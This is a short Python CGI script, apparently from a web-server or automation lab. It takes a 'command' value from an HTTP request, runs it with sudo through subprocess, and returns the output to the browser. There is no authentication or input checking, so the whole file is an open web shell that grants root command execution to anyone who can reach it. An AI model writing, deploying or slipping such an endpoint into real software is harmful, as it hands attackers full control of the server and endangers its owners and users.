#!/usr/bin/python3


print("content-type: text/html")
print()


import subprocess as sb
import cgi

print("Welcome")
var = cgi.FieldStorage("command")
command = var.getvalue("command")
output = sb.getoutput("sudo " + command)
print(output)
